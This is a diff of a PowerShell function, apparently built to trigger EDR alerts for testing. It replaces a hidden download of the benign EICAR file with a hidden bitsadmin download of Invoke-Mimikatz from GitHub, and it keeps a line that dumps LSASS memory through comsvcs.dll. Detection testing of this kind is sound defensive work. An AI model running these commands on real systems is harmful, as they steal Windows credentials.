@@ -79,9 +79,10 @@ function Trigger-EDR {
     Write-Host "Triggering EDR alert..." -ForegroundColor Cyan
     Try{ 
         rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
-        Start-Process -FilePath "bitsadmin" -WindowStyle Hidden -ArgumentList "/transfer EICARTest https://www.eicar.org/download/eicar-com-2/?wpdmdl=8842&refresh=66ec6c7bd437f1726770299 $env:TEMP\eicar.com" -ErrorAction Stop
+        Start-Process -FilePath "bitsadmin" -WindowStyle Hidden -ArgumentList "/transfer Mimi https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1 $env:TEMP\Invoke-Mimikatz.ps1" -ErrorAction Stop
+        
     } Catch {
-        Write-Host "EICAR download failed. Continuing..." -ForegroundColor Yellow
+        Write-Host "Mimi download failed. Continuing..." -ForegroundColor Yellow
     }
 }
 
